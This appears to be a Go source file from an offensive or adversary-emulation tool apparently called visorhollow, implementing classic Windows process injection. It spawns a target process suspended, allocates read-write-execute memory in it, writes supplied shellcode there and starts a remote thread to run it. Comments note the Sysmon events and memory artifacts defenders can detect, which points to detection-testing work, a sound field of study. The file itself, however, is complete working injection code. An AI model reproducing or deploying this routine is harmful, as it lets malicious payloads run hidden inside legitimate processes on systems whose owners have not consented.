//go:build windows

package technique

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	procVirtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
	procVirtualFreeEx      = kernel32.NewProc("VirtualFreeEx")
	procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
)

func virtualAllocEx(process windows.Handle, addr, size uintptr, allocType, protect uint32) (uintptr, error) {
	r1, _, err := procVirtualAllocEx.Call(
		uintptr(process), addr, size,
		uintptr(allocType), uintptr(protect),
	)
	if r1 == 0 {
		return 0, fmt.Errorf("VirtualAllocEx: %w", err)
	}
	return r1, nil
}

func virtualFreeEx(process windows.Handle, addr uintptr) {
	procVirtualFreeEx.Call(uintptr(process), addr, 0, uintptr(windows.MEM_RELEASE))
}

func createRemoteThread(process windows.Handle, startAddr, param uintptr) (windows.Handle, uint32, error) {
	var tid uint32
	r1, _, err := procCreateRemoteThread.Call(
		uintptr(process),
		0, 0,              // lpThreadAttributes, dwStackSize
		startAddr,
		param,
		0,                 // dwCreationFlags (run immediately)
		uintptr(unsafe.Pointer(&tid)),
	)
	if r1 == 0 {
		return 0, 0, fmt.Errorf("CreateRemoteThread: %w", err)
	}
	return windows.Handle(r1), tid, nil
}

// ClassicInject uses the canonical WriteProcessMemory + CreateRemoteThread path.
//
// Detection fingerprint:
//   - Sysmon Event 10: OpenProcess from visorhollow.exe → target PID
//   - Sysmon Event 8: CreateRemoteThread into target process
//   - RWX VirtualAllocEx region visible in target's VAD
//   - Thread start address outside any loaded PE image
func ClassicInject(targetExe string, shellcode []byte) error {
	fmt.Printf("  [technique] VirtualAllocEx + WriteProcessMemory + CreateRemoteThread\n")
	fmt.Printf("  [target]    %s\n", targetExe)
	fmt.Printf("  [payload]   %d bytes\n", len(shellcode))

	// --- Step 1: Spawn target process suspended ---
	targetPath, err := resolveExecutable(targetExe)
	if err != nil {
		return fmt.Errorf("resolve target: %w", err)
	}

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	targetPathPtr, _ := windows.UTF16PtrFromString(targetPath)
	err = windows.CreateProcess(
		nil,
		targetPathPtr,
		nil, nil, false,
		windows.CREATE_SUSPENDED,
		nil, nil,
		&si, &pi,
	)
	if err != nil {
		return fmt.Errorf("CreateProcess(%s): %w", targetPath, err)
	}
	fmt.Printf("  [spawned]   PID %d TID %d (suspended)\n", pi.ProcessId, pi.ThreadId)

	defer func() {
		windows.CloseHandle(pi.Thread)
		windows.CloseHandle(pi.Process)
	}()

	// --- Step 2: VirtualAllocEx — allocate RWX in target ---
	// This is the loudest signal: RWX allocation in a remote process.
	addr, err := virtualAllocEx(pi.Process, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return err
	}
	fmt.Printf("  [alloc]     0x%x (RWX, %d bytes)\n", addr, len(shellcode))

	// --- Step 3: WriteProcessMemory ---
	// Sysmon doesn't event on WPM directly, but RWX alloc + CreateRemoteThread is the compound signal.
	var written uintptr
	err = windows.WriteProcessMemory(
		pi.Process,
		addr,
		&shellcode[0],
		uintptr(len(shellcode)),
		&written,
	)
	if err != nil || written != uintptr(len(shellcode)) {
		virtualFreeEx(pi.Process, addr)
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("WriteProcessMemory: wrote %d/%d: %w", written, len(shellcode), err)
	}
	fmt.Printf("  [written]   %d bytes to 0x%x\n", written, addr)

	// --- Step 4: CreateRemoteThread ---
	// Sysmon Event 8. Source: visorhollow.exe → target process.
	// Start address outside any loaded PE module = immediate flag.
	thread, tid, err := createRemoteThread(pi.Process, addr, 0)
	if err != nil {
		virtualFreeEx(pi.Process, addr)
		windows.TerminateProcess(pi.Process, 1)
		return err
	}
	defer windows.CloseHandle(thread)

	fmt.Printf("  [thread]    TID %d executing at 0x%x\n", tid, addr)

	// Resume the suspended main thread (target process runs normally alongside shellcode)
	if _, err := windows.ResumeThread(pi.Thread); err != nil {
		return fmt.Errorf("ResumeThread: %w", err)
	}
	fmt.Printf("  [resumed]   PID %d\n", pi.ProcessId)

	return nil
}
